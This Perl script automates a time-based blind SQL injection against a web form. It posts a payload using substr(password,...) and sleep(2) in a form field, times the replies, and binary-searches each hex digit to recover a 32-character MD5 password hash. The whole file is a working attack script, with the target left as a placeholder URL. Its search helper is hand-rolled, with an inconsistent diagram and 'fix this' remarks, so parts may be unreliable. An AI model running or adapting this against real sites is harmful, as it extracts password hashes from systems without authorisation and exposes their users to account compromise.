# Copyright (c) 2016-.. #John
#
# Author: #John <pocolab.com@gmail.com>
# URL: http://www.pocolab.com
# Version: 1.0.0

# Commentary:

# Blind md5 in 128 attemps

# License:

# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 3
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with GNU Emacs; see the file COPYING.  If not, write to the
# Free Software Foundation, Inc., 51 Franklin Street, Fifth Floor,
# Boston, MA 02110-1301, USA.
use strict;
use warnings;
use LWP::Simple;
use open ':std', ':encoding(UTF-8)';
use utf8;
use HTTP::Request;
use experimental 'smartmatch';
use Time::HiRes qw(time);

my$const_url="http://index.php";
my@results=();

my$rrrequest=0;
sub makerequest{
	my$p="$_[0]";
	my$pos=$_[1]+1;

print("      request: $rrrequest\n");
$rrrequest++;

	my$shit;
$shit="11' or (substr(password,$pos,1)>'".$p."' and 1=sleep(2)) -- -";
	my$request=HTTP::Request->new(POST=>$const_url);
$request->content_type('application/x-www-form-urlencoded');
$request->content("it=ct&en=$shit");
	$request->header("Cookie"=>"AAA=BBB");
#print($request->as_string."\n");
	my$ua=LWP::UserAgent->new;
	my$response=$ua->request($request);
	if ($response->is_success) {
		return $response->decoded_content;
	}
	else {
#print STDERR $response->status_line, "\n";
	}
}

sub shit_i{
	my$i=$_[0];
	if($i>9){
		return chr($i+55);
	}
return "$i";
}

#                        >4     -    >8   -       >12
#                       /   \                 /         \
#                     >2      >6            >10              >14
#                    /  \    /  \          /    \          /     \
#                  >1  (3) >5   >7       >9       >11     >13       (15)
#                 / \     / \   / \      / \      /  \     /  \     
#               (0) (1)(5) (6) (7) (8) (9) (10) (11) (12) (13) (14)

sub check{
        my$c=$_[0];
        my$i=$_[1];
        my$fl=$_[2];
        my$min=0;
        my$max=$c;
        my$t;

        my$n=$i%2;
        if($n==1){
                if($fl>0||$min+2==$i||$max-2==$i){$t=$i+1;}
                else{$t=$i-1;}
                return(1,$t);
        }

# TODO: fix this shit
        if($i==2||$i==6||$i==10||$i==14){
                $t=$fl>0?$i+1:$i-1;
                return(0,$t);
        }
# TODO: fix this shit
if($i==4){$t=$fl>0?6:2;}
if($i==12){$t=$fl>0?14:10;}
if($i==8){$t=$fl>0?12:4;}
return(0,$t);
}


sub get_result{ 
	my$result="";
	my$min=0;
	my$max=16;
	my$str="";
	my$r;
	my$tmp;
	my$t1;
	my$t2;
	my$t3;

	my$fl;
	my@x;

	for(my$i=0;$i<32;$i++){

		$tmp=8;
label:
		$str=shit_i($tmp);
		print("    i: $i; str: $str; tmp: $tmp\n");
		$t1=time;
		$r=makerequest($str,$i);
		$t2=time;
		$t3=$t2-$t1;
		$fl=$t3>2?1:0;
		@x=check($max,$tmp,$fl);
		print("    check: @x; fl: $fl; t3: $t3 \n");
		if ($x[0]>0) {
			$result.=$str;
			print("res: $result\n");
			goto cont;
		}
		else{
			$tmp=$x[1];
			goto label;
		}
cont:;


	}
}

sub main(){


	get_result();

}
main(); 



